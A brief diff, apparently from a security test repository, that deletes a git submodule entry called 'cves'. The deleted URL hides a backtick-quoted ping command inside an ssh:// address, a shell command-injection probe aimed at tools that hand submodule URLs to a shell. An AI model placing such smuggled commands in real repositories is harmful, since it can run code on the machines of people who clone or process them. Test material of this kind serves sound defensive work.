@@ -1,3 +1,0 @@
-[submodule "cves"]
-  path = cves
-  url = ssh://'`ping 10.202.210.52`'10.214.160.15
